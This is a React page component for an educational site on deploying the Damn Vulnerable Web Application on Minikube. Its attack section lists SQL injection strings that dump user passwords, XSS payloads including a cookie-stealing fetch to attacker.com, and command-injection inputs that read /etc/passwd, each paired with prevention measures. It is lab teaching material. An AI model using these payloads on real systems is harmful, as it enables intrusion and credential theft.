import Link from "next/link"
import Image from "next/image"
import { Terminal, Shield, AlertTriangle, ChevronRight, Server, Database, Code } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"

export default function Home() {
  return (
    <div className="flex min-h-screen flex-col">
      <header className="sticky top-0 z-50 w-full border-b bg-background/95 backdrop-blur supports-[backdrop-filter]:bg-background/60">
        <div className="container flex h-16 items-center space-x-4 sm:justify-between sm:space-x-0">
          <div className="flex gap-2 items-center text-xl font-bold">
            <Shield className="h-6 w-6 text-red-500" />
            <span>DVWA on Kubernetes</span>
          </div>
          <div className="flex flex-1 items-center justify-end space-x-4">
            <nav className="flex items-center space-x-2">
              <Link
                href="https://github.com/digininja/DVWA"
                target="_blank"
                rel="noreferrer"
                className="text-sm font-medium text-muted-foreground transition-colors hover:text-primary"
              >
                DVWA Docs
              </Link>
              <Link
                href="https://kubernetes.io/docs/home/"
                target="_blank"
                rel="noreferrer"
                className="text-sm font-medium text-muted-foreground transition-colors hover:text-primary"
              >
                Kubernetes
              </Link>
            </nav>
          </div>
        </div>
      </header>
      <main className="flex-1">
        <section className="w-full py-12 md:py-24 lg:py-32 bg-red-50 dark:bg-red-950/20">
          <div className="container px-4 md:px-6">
            <div className="grid gap-6 lg:grid-cols-[1fr_400px] lg:gap-12 xl:grid-cols-[1fr_600px]">
              <div className="flex flex-col justify-center space-y-4">
                <div className="space-y-2">
                  <h1 className="text-3xl font-bold tracking-tighter sm:text-5xl xl:text-6xl/none">
                    DVWA on Kubernetes
                  </h1>
                  <p className="max-w-[600px] text-muted-foreground md:text-xl">
                    Deploy the Damn Vulnerable Web Application on a local Kubernetes cluster and explore common web
                    vulnerabilities
                  </p>
                </div>
                <div className="flex flex-col gap-2 min-[400px]:flex-row">
                  <Link href="#setup">
                    <Button className="bg-red-600 hover:bg-red-700">
                      Get Started
                      <ChevronRight className="ml-2 h-4 w-4" />
                    </Button>
                  </Link>
                  <Link href="#attacks">
                    <Button variant="outline">View Attack Vectors</Button>
                  </Link>
                </div>
              </div>
              <div className="flex items-center justify-center">
                <Image
                  src="/placeholder.svg?height=400&width=600"
                  width={600}
                  height={400}
                  alt="DVWA on Kubernetes"
                  className="rounded-lg object-cover border shadow-lg"
                />
              </div>
            </div>
          </div>
        </section>

        <section id="setup" className="w-full py-12 md:py-24 lg:py-32">
          <div className="container px-4 md:px-6">
            <div className="mx-auto flex max-w-[58rem] flex-col items-center justify-center space-y-4 text-center">
              <h2 className="text-3xl font-bold tracking-tighter sm:text-4xl md:text-5xl">Kubernetes Setup</h2>
              <p className="max-w-[85%] text-muted-foreground md:text-xl/relaxed lg:text-base/relaxed xl:text-xl/relaxed">
                Follow these steps to set up a local Kubernetes cluster using Minikube and deploy DVWA
              </p>
            </div>
            <div className="mx-auto grid justify-center gap-4 sm:grid-cols-2 md:max-w-[64rem] md:grid-cols-3 mt-8">
              <Card className="border-2">
                <CardHeader className="pb-2">
                  <CardTitle className="flex items-center gap-2">
                    <Server className="h-5 w-5 text-red-500" />
                    Install Minikube
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-sm text-muted-foreground">
                    Set up a local Kubernetes cluster with Minikube to run DVWA in a controlled environment.
                  </p>
                </CardContent>
                <CardFooter>
                  <Link href="#minikube-setup">
                    <Button variant="outline" size="sm">
                      View Instructions
                    </Button>
                  </Link>
                </CardFooter>
              </Card>
              <Card className="border-2">
                <CardHeader className="pb-2">
                  <CardTitle className="flex items-center gap-2">
                    <Shield className="h-5 w-5 text-red-500" />
                    Deploy DVWA
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-sm text-muted-foreground">
                    Deploy the Damn Vulnerable Web Application to your Kubernetes cluster using kubectl.
                  </p>
                </CardContent>
                <CardFooter>
                  <Link href="#dvwa-deployment">
                    <Button variant="outline" size="sm">
                      View Instructions
                    </Button>
                  </Link>
                </CardFooter>
              </Card>
              <Card className="border-2">
                <CardHeader className="pb-2">
                  <CardTitle className="flex items-center gap-2">
                    <AlertTriangle className="h-5 w-5 text-red-500" />
                    Attack Vectors
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-sm text-muted-foreground">
                    Explore three common attack vectors: SQL Injection, XSS, and Command Injection.
                  </p>
                </CardContent>
                <CardFooter>
                  <Link href="#attacks">
                    <Button variant="outline" size="sm">
                      View Attacks
                    </Button>
                  </Link>
                </CardFooter>
              </Card>
            </div>
          </div>
        </section>

        <section id="minikube-setup" className="w-full py-12 md:py-24 lg:py-32 bg-slate-50 dark:bg-slate-950/50">
          <div className="container px-4 md:px-6">
            <div className="mx-auto flex max-w-[58rem] flex-col items-center justify-center space-y-4 text-center">
              <h2 className="text-3xl font-bold tracking-tighter sm:text-4xl">Minikube Setup</h2>
              <p className="max-w-[85%] text-muted-foreground md:text-xl/relaxed lg:text-base/relaxed xl:text-xl/relaxed">
                Setting up a local Kubernetes cluster with Minikube
              </p>
            </div>
            <div className="mx-auto grid justify-center gap-8 md:max-w-[64rem] mt-8">
              <Card>
                <CardHeader>
                  <CardTitle>Installation Steps</CardTitle>
                  <CardDescription>Follow these steps to install and configure Minikube</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="rounded-md bg-black p-6">
                    <pre className="text-white text-sm">
                      <code>
                        {`# Install Minikube (macOS with Homebrew)
brew install minikube

# Install Minikube (Linux)
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube

# Install Minikube (Windows with Chocolatey)
choco install minikube

# Start Minikube
minikube start

# Verify installation
minikube status
kubectl get nodes`}
                      </code>
                    </pre>
                  </div>
                  <div className="space-y-2">
                    <h3 className="text-lg font-medium">Requirements</h3>
                    <ul className="list-disc pl-5 text-sm text-muted-foreground">
                      <li>Docker, Hyperkit, Hyper-V, VirtualBox, or Podman</li>
                      <li>kubectl command-line tool</li>
                      <li>2 CPUs or more</li>
                      <li>2GB of free memory</li>
                      <li>20GB of free disk space</li>
                    </ul>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        </section>

        <section id="dvwa-deployment" className="w-full py-12 md:py-24 lg:py-32">
          <div className="container px-4 md:px-6">
            <div className="mx-auto flex max-w-[58rem] flex-col items-center justify-center space-y-4 text-center">
              <h2 className="text-3xl font-bold tracking-tighter sm:text-4xl">DVWA Deployment</h2>
              <p className="max-w-[85%] text-muted-foreground md:text-xl/relaxed lg:text-base/relaxed xl:text-xl/relaxed">
                Deploy the Damn Vulnerable Web Application to your Kubernetes cluster
              </p>
            </div>
            <div className="mx-auto grid justify-center gap-8 md:max-w-[64rem] mt-8">
              <Tabs defaultValue="yaml" className="w-full">
                <TabsList className="grid w-full grid-cols-2">
                  <TabsTrigger value="yaml">YAML Configuration</TabsTrigger>
                  <TabsTrigger value="commands">Deployment Commands</TabsTrigger>
                </TabsList>
                <TabsContent value="yaml" className="space-y-4">
                  <Card>
                    <CardHeader>
                      <CardTitle>DVWA Deployment YAML</CardTitle>
                      <CardDescription>Save this as dvwa-deployment.yaml</CardDescription>
                    </CardHeader>
                    <CardContent>
                      <div className="rounded-md bg-black p-6">
                        <pre className="text-white text-sm">
                          <code>
                            {`apiVersion: apps/v1
kind: Deployment
metadata:
  name: dvwa
  labels:
    app: dvwa
spec:
  replicas: 1
  selector:
    matchLabels:
      app: dvwa
  template:
    metadata:
      labels:
        app: dvwa
    spec:
      containers:
      - name: dvwa
        image: vulnerables/web-dvwa
        ports:
        - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: dvwa-service
spec:
  selector:
    app: dvwa
  ports:
  - port: 80
    targetPort: 80
  type: NodePort`}
                          </code>
                        </pre>
                      </div>
                    </CardContent>
                  </Card>
                </TabsContent>
                <TabsContent value="commands" className="space-y-4">
                  <Card>
                    <CardHeader>
                      <CardTitle>Deployment Commands</CardTitle>
                      <CardDescription>Run these commands to deploy DVWA</CardDescription>
                    </CardHeader>
                    <CardContent>
                      <div className="rounded-md bg-black p-6">
                        <pre className="text-white text-sm">
                          <code>
                            {`# Apply the deployment configuration
kubectl apply -f dvwa-deployment.yaml

# Check if the pod is running
kubectl get pods

# Check the service
kubectl get services dvwa-service

# Get the URL to access DVWA
minikube service dvwa-service --url

# Open DVWA in your browser
minikube service dvwa-service`}
                          </code>
                        </pre>
                      </div>
                    </CardContent>
                  </Card>
                </TabsContent>
              </Tabs>
              <Card>
                <CardHeader>
                  <CardTitle>Initial DVWA Setup</CardTitle>
                  <CardDescription>Configure DVWA after deployment</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-2">
                    <h3 className="text-lg font-medium">Access DVWA</h3>
                    <p className="text-sm text-muted-foreground">
                      Once deployed, access DVWA using the URL provided by the{" "}
                      <code>minikube service dvwa-service --url</code> command.
                    </p>
                  </div>
                  <div className="space-y-2">
                    <h3 className="text-lg font-medium">Login Credentials</h3>
                    <p className="text-sm text-muted-foreground">Default login credentials:</p>
                    <ul className="list-disc pl-5 text-sm text-muted-foreground">
                      <li>
                        Username: <code>admin</code>
                      </li>
                      <li>
                        Password: <code>password</code>
                      </li>
                    </ul>
                  </div>
                  <div className="space-y-2">
                    <h3 className="text-lg font-medium">Database Setup</h3>
                    <p className="text-sm text-muted-foreground">
                      After logging in, click on "Create / Reset Database" to set up the DVWA database.
                    </p>
                  </div>
                  <div className="space-y-2">
                    <h3 className="text-lg font-medium">Security Level</h3>
                    <p className="text-sm text-muted-foreground">
                      Set the security level to "low" in the DVWA Security settings to make vulnerabilities easier to
                      exploit.
                    </p>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        </section>

        <section id="attacks" className="w-full py-12 md:py-24 lg:py-32 bg-red-50 dark:bg-red-950/20">
          <div className="container px-4 md:px-6">
            <div className="mx-auto flex max-w-[58rem] flex-col items-center justify-center space-y-4 text-center">
              <h2 className="text-3xl font-bold tracking-tighter sm:text-4xl">Attack Vectors</h2>
              <p className="max-w-[85%] text-muted-foreground md:text-xl/relaxed lg:text-base/relaxed xl:text-xl/relaxed">
                Explore three common attack vectors in DVWA
              </p>
            </div>
            <div className="mx-auto grid justify-center gap-8 md:max-w-[64rem] mt-8">
              <Tabs defaultValue="sql" className="w-full">
                <TabsList className="grid w-full grid-cols-3">
                  <TabsTrigger value="sql">SQL Injection</TabsTrigger>
                  <TabsTrigger value="xss">XSS</TabsTrigger>
                  <TabsTrigger value="command">Command Injection</TabsTrigger>
                </TabsList>
                <TabsContent value="sql" className="space-y-4">
                  <Card>
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2">
                        <Database className="h-5 w-5 text-red-500" />
                        SQL Injection
                      </CardTitle>
                      <CardDescription>Exploiting SQL Injection vulnerabilities in DVWA</CardDescription>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      <div className="space-y-2">
                        <h3 className="text-lg font-medium">What is SQL Injection?</h3>
                        <p className="text-sm text-muted-foreground">
                          SQL Injection is a code injection technique that exploits vulnerabilities in applications that
                          interact with databases. Attackers can insert malicious SQL statements that can read, modify,
                          or delete data from the database.
                        </p>
                      </div>
                      <div className="space-y-2">
                        <h3 className="text-lg font-medium">DVWA SQL Injection Demo</h3>
                        <div className="rounded-md bg-black p-6">
                          <pre className="text-white text-sm">
                            <code>
                              {`# Basic SQL Injection to bypass authentication
' OR '1'='1

# SQL Injection to extract database version
' UNION SELECT 1,@@version#

# SQL Injection to extract user table information
' UNION SELECT user,password FROM users#

# SQL Injection to extract database names
' UNION SELECT 1,schema_name FROM information_schema.schemata#`}
                            </code>
                          </pre>
                        </div>
                      </div>
                      <div className="space-y-2">
                        <h3 className="text-lg font-medium">Steps to Exploit</h3>
                        <ol className="list-decimal pl-5 text-sm text-muted-foreground space-y-1">
                          <li>Navigate to the SQL Injection page in DVWA</li>
                          <li>Enter a user ID with a SQL injection payload</li>
                          <li>Observe how the application responds with database information</li>
                          <li>Try different payloads to extract more information</li>
                        </ol>
                      </div>
                      <div className="space-y-2">
                        <h3 className="text-lg font-medium">Prevention Measures</h3>
                        <ul className="list-disc pl-5 text-sm text-muted-foreground space-y-1">
                          <li>Use prepared statements with parameterized queries</li>
                          <li>Apply input validation and sanitization</li>
                          <li>Implement least privilege database accounts</li>
                          <li>Use ORM frameworks that handle SQL escaping</li>
                        </ul>
                      </div>
                    </CardContent>
                  </Card>
                </TabsContent>
                <TabsContent value="xss" className="space-y-4">
                  <Card>
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2">
                        <Code className="h-5 w-5 text-red-500" />
                        Cross-Site Scripting (XSS)
                      </CardTitle>
                      <CardDescription>Exploiting XSS vulnerabilities in DVWA</CardDescription>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      <div className="space-y-2">
                        <h3 className="text-lg font-medium">What is XSS?</h3>
                        <p className="text-sm text-muted-foreground">
                          Cross-Site Scripting (XSS) is a type of security vulnerability that allows attackers to inject
                          client-side scripts into web pages viewed by other users. This can be used to steal cookies,
                          session tokens, or other sensitive information.
                        </p>
                      </div>
                      <div className="space-y-2">
                        <h3 className="text-lg font-medium">DVWA XSS Demo</h3>
                        <div className="rounded-md bg-black p-6">
                          <pre className="text-white text-sm">
                            <code>
                              {`# Basic XSS payload to display an alert
<script>alert('XSS')</script>

# XSS payload to steal cookies
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

# XSS payload with HTML injection
<img src="x" onerror="alert('XSS')">

# DOM-based XSS payload
<a href="javascript:alert('XSS')">Click me</a>`}
                            </code>
                          </pre>
                        </div>
                      </div>
                      <div className="space-y-2">
                        <h3 className="text-lg font-medium">Steps to Exploit</h3>
                        <ol className="list-decimal pl-5 text-sm text-muted-foreground space-y-1">
                          <li>Navigate to the XSS (Reflected) or XSS (Stored) page in DVWA</li>
                          <li>Enter a payload in the input field</li>
                          <li>Submit the form and observe how the script executes</li>
                          <li>For stored XSS, the payload will execute whenever the page is loaded</li>
                        </ol>
                      </div>
                      <div className="space-y-2">
                        <h3 className="text-lg font-medium">Prevention Measures</h3>
                        <ul className="list-disc pl-5 text-sm text-muted-foreground space-y-1">
                          <li>Encode output data to prevent script execution</li>
                          <li>Implement Content Security Policy (CSP)</li>
                          <li>Validate and sanitize user input</li>
                          <li>Use modern frameworks that automatically escape output</li>
                        </ul>
                      </div>
                    </CardContent>
                  </Card>
                </TabsContent>
                <TabsContent value="command" className="space-y-4">
                  <Card>
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2">
                        <Terminal className="h-5 w-5 text-red-500" />
                        Command Injection
                      </CardTitle>
                      <CardDescription>Exploiting Command Injection vulnerabilities in DVWA</CardDescription>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      <div className="space-y-2">
                        <h3 className="text-lg font-medium">What is Command Injection?</h3>
                        <p className="text-sm text-muted-foreground">
                          Command Injection is an attack where the goal is to execute arbitrary commands on the host
                          operating system via a vulnerable application. These attacks are possible when an application
                          passes unsafe user-supplied data to a system shell.
                        </p>
                      </div>
                      <div className="space-y-2">
                        <h3 className="text-lg font-medium">DVWA Command Injection Demo</h3>
                        <div className="rounded-md bg-black p-6">
                          <pre className="text-white text-sm">
                            <code>
                              {`# Basic command injection with ping
127.0.0.1; ls -la

# Command injection to view system information
127.0.0.1 && cat /etc/passwd

# Command injection with command chaining
127.0.0.1 && whoami && id

# Command injection with output redirection
127.0.0.1 && whoami > /tmp/output.txt`}
                            </code>
                          </pre>
                        </div>
                      </div>
                      <div className="space-y-2">
                        <h3 className="text-lg font-medium">Steps to Exploit</h3>
                        <ol className="list-decimal pl-5 text-sm text-muted-foreground space-y-1">
                          <li>Navigate to the Command Injection page in DVWA</li>
                          <li>Enter an IP address followed by a command separator (;, &&, ||)</li>
                          <li>Add the command you want to execute</li>
                          <li>Submit the form and observe the command output</li>
                        </ol>
                      </div>
                      <div className="space-y-2">
                        <h3 className="text-lg font-medium">Prevention Measures</h3>
                        <ul className="list-disc pl-5 text-sm text-muted-foreground space-y-1">
                          <li>Avoid calling system commands directly</li>
                          <li>Use APIs instead of command line calls</li>
                          <li>Implement strict input validation</li>
                          <li>Run applications with minimal privileges</li>
                          <li>Use allowlists for permitted commands</li>
                        </ul>
                      </div>
                    </CardContent>
                  </Card>
                </TabsContent>
              </Tabs>
            </div>
          </div>
        </section>

        <section className="w-full py-12 md:py-24 lg:py-32">
          <div className="container px-4 md:px-6">
            <div className="mx-auto flex max-w-[58rem] flex-col items-center justify-center space-y-4 text-center">
              <h2 className="text-3xl font-bold tracking-tighter sm:text-4xl">Security Considerations</h2>
              <p className="max-w-[85%] text-muted-foreground md:text-xl/relaxed lg:text-base/relaxed xl:text-xl/relaxed">
                Important security considerations when working with DVWA
              </p>
            </div>
            <div className="mx-auto grid justify-center gap-8 md:max-w-[64rem] mt-8">
              <Card className="border-red-200 bg-red-50 dark:border-red-900 dark:bg-red-950/50">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-red-600">
                    <AlertTriangle className="h-5 w-5" />
                    Warning
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2">
                    <p className="text-sm text-muted-foreground">
                      DVWA is intentionally vulnerable and should only be used in a controlled environment:
                    </p>
                    <ul className="list-disc pl-5 text-sm text-muted-foreground space-y-1">
                      <li>Never deploy DVWA on a production server or public network</li>
                      <li>Use a dedicated, isolated environment for security testing</li>
                      <li>Do not use real credentials or sensitive data</li>
                      <li>Consider using a firewall to restrict access to your Minikube cluster</li>
                      <li>
                        Stop the Minikube cluster when not in use with <code>minikube stop</code>
                      </li>
                    </ul>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        </section>
      </main>
      <footer className="flex flex-col gap-2 sm:flex-row py-6 w-full shrink-0 items-center px-4 md:px-6 border-t">
        <p className="text-xs text-muted-foreground">
          &copy; {new Date().getFullYear()} DVWA on Kubernetes Demo. For educational purposes only.
        </p>
        <nav className="sm:ml-auto flex gap-4 sm:gap-6">
          <Link
            href="https://github.com/digininja/DVWA"
            className="text-xs hover:underline underline-offset-4"
            target="_blank"
          >
            DVWA GitHub
          </Link>
          <Link href="https://kubernetes.io" className="text-xs hover:underline underline-offset-4" target="_blank">
            Kubernetes
          </Link>
          <Link
            href="https://minikube.sigs.k8s.io"
            className="text-xs hover:underline underline-offset-4"
            target="_blank"
          >
            Minikube
          </Link>
        </nav>
      </footer>
    </div>
  )
}
